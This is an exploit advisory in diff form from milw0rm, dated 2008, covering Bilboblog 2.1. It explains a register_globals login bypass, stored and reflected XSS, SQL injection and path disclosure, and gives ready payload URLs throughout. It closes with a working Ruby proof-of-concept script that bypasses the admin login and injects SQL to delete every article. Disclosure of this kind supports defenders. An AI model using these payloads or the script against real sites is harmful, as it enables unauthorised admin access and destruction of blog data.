@@ -1,0 +1,195 @@
+  ------------------------------------------------------------------
+
+  Name         :   Bilboblog 2.1 Multiples Vulnerabilities
+  Description  :   Bilboblog is a small application of micro-blogging in Php / MySQL
+  Link         :   http://www.tux-planet.fr/bilboblog-version-021-english-translation/
+
+  Vuln. types  :   Login Bypass - Cross Site Scripting - SQL Injection - Full Path Disclosure
+ 
+  Conditions   :   - SQL Injection      :  Magic Quotes Off
+                   - Login Bypass, XSS  :  Register Globals On
+ 
+  Credits      :   Black_H <bl4ck.h@gmail.com>
+
+  ------------------------------------------------------------------
+
+
+   .: I. Login Bypass
+   -------------------
+ 
+   This vulnerability need register_global on.
+   The file "admin/index.php" (and most of the admin files) includes the file 'login.php' (at line 23) which contains :
+ 
+   22| session_start();
+   23| $checkLogin = false;
+   24| #echo "toto".$_SESSION['admin_login']; // note: wtf ??
+   25| if(!isset($_SESSION['admin_login'])) {
+   26|
+   27|   # Check form values
+   28|   if (isset($_POST) && (!empty($_POST['admin_login'])) && (!empty($_POST['admin_passwd'])) ) {
+   29|
+   30|     # Get Session vriables
+   31|     $admin_login  = trim($_POST['admin_login']);
+   32|     $admin_passwd = trim($_POST['admin_passwd']);
+   33|
+   34|     # Check login
+   35|     if($admin_login == $login && $admin_passwd == $password) {
+   36|       $checkLogin = true;
+   37|       $_SESSION['admin_login']  = $admin_login;
+   38|      $_SESSION['admin_passwd'] = $admin_passwd;
+   39|     }
+   40|   }
+   41|
+   42| } else {
+   43|   $checkLogin = true;
+   44| }
+   45|
+   46|    22| if(!$checkLogin) {
+   47|
+   48|   # Print login form
+            [...]
+   58|     exit(0);   
+   59| }
+  
+   So, we need the session 'admin_login' ( $_SESSION['admin_login'] ) to have admin rights in all files. The script checks
+   if we have post good login and pass or not. It's look like good, but if we call directly the login.php file,
+   the $login and $password variable  are not defined. We can set them with register_globals on, valid the form with
+   the same value and so set $_SESSION['admin_login'].
+  
+   In facts, go on the page http://site.com/bilboblog/admin/login.php?login=1&password=1 and fill the forms with '1' value
+   and submit. Because checkLogin is true nothing is printed and you're  admin :)))
+ 
+ 
+
+   .: II. Cross Site Scripting
+   ----------------------------
+     
+        1) Permanent XSS
+       
+   When an admin  ( legitim or not :)) ) post an article, the enCode function is applied to the content :
+
+   ---- 'admin/update.php'
+  
+   25| # Check values
+   26| if(isset($_POST['content']) && $_POST['content'] != "") {
+   27| $content = enCode(substr(trim($_POST['content']), 0, $limit_post));
+        [...]
+   36| # Insert new content
+   37| $sql = "INSERT INTO $db_table VALUES ('', '".time()."', '$content');";
+   38| $result = mysql_query($sql);
+ 
+   ---- 'admin/function.php'
+  
+   141| function enCode($chaine) {
+   142|
+        [...] // # Youtube & Dailymotion encode url
+   145|
+   146|  # Detect string encoding
+   147|  $encodage = mb_detect_encoding($chaine);
+   148|  if($encodage == "ASCII") $encodage = "iso-8859-1"; # Htmlentities unknown ASCII
+   149|                
+   150|  # Convert special char to html code
+   151|  $chaine = htmlentities($chaine,ENT_QUOTES,$encodage);
+   152|  $chaine = addslashes($chaine);
+   153| 
+   154|  # Return result
+   155|  return $chaine;
+   156| }
+
+   The function clean all html chars in the content that we've submit.
+   It protects the user against XSS in all pages of the blog but in the 'widget.php' file stripslashes()
+   and html_entity_decode() functions is applied to the content which is printed !
+   So je just need to get admin rights (see upper) post malicious code and share widget.php's url to the victim.
+       
+        2) Unpermanents XSS
+       
+   The file "index.php" includes the file 'head.php' (at line 21) which contains :
+
+   44| if ($_SERVER['QUERY_STRING'] != "" && intval($_SERVER['QUERY_STRING']) != "") {
+     [...]
+   55| $titleId = str2Url($liste[2], 100, 0).' - '.$title;
+   56| }
+
+   78| <title><?php if(!empty($titleId)) { echo $titleId; } else { echo $title; } ?></title>
+   79| </head>
+ 
+   When a page is loaded, the script checks if a number is present in the url to see if she could print an article.
+   If the URL ( $_SERVER['QUERY_STRING'] ) contains a number (the id) the script load the article corresponding to the id
+   in $_SERVER['QUERY_STRING'].
+ 
+   If $_SERVER['QUERY_STRING'] (the url) do not contain a number, the variable $titleId is not set and print :
+   we can define it on add a parameter titleId in the url and his value will be printed on the web page.
+   But, the variable $titleId is betwenn the <head> balise, so we need to add </title></head><body> before the malicious code.
+   We have : http://site.com/bilboblog/?titleId=TITLE</title></head><body><script>alert(1);</script>
+  
+   Anyway, there are unfunny XSS in admin files and 'footer.php' :
+
+        http://site.com/bilboblog/footer.php?t_lang[lang_copyright]=XSS
+        http://site.com/bilboblog/admin/?content=</textarea>XSS
+        http://site.com/bilboblog/admin/homelink.php?url=">XSS
+        http://site.com/bilboblog/admin/homelink.php?t_lang[lang_admin_help]=XSS
+        http://site.com/bilboblog/admin/homelink.php?t_lang[lang_admin_clear_cache]=XSS
+        http://site.com/bilboblog/admin/homelink.php?t_lang[lang_admin_home]=XSS
+        http://site.com/bilboblog/admin/homelink.php?t_lang[lang_admin_logout]=XSS
+       
+    and also in /admin/post.php ...
+
+   
+   
+   .: III. SQL Injection
+   ----------------------
+  
+   In admin panel, we can delete articles by sending article's id we want to supress to the script delete.php
+   which clean the id of spaces and include it in a basic sql query :
+  
+   25| # Check values
+   26| if(isset($_POST['num']) && $_POST['num'] != "") {
+   27| $article = trim($_POST['num']);
+  
+   36| # Insert new content // It's look like a copy/paste :))
+   37| $sql = "DELETE FROM $db_table WHERE num_article = '$article';";
+   38| $result = mysql_query($sql);  
+  
+   So, with magic_quotes off, we can inject sql code in the query and, by example, delete all entries
+   (all articles) in the database.
+   To delete all entries, we must send a post request to delete.php, for the poc see at the end of file.
+ 
+ 
+ 
+   .: IV. Full Path Disclosure
+   ----------------------------
+  
+   And to finish, the are to FPD which can be exploited for a server attack or in sql injection :
+        http://localhost/Audits/bilboblog/footer.php?enable_cache=false
+        http://localhost/Audits/bilboblog/pagination.php // don't need any conditions
+   
+   
+   
+   .: Õ. SQL INJECTION POC (Ruby)
+   ---------------------------------------
+
+   # -- CUT
+
+   # Config
+   host = 'site.com'
+   path = '/bilboblog/'
+   # -- End
+
+   require 'net/http'
+   http = Net::HTTP.new(host)
+
+   data = { 0 => "admin_login=1&admin_passwd=1", 1 => "num=-1'  OR num_article > 0#" }
+   resp = http.post(path+'admin/login.php?login=1&password=1', data[0])
+
+   cookie = {  'Cookie' => resp.response['set-cookie'] }
+   resp = http.post(path+'admin/delete.php', data[1], cookie)
+   if(resp.code.to_s == '302') : puts 'Done !' end
+
+
+   # -- EOF
+  
+       
+   Black_H <bl4ck.h@gmail.com> - blackh.eu
+   http://blackh.eu/Advisories/Billboblog_2.1_Advisories.txt
+
+# milw0rm.com [2008-07-14]
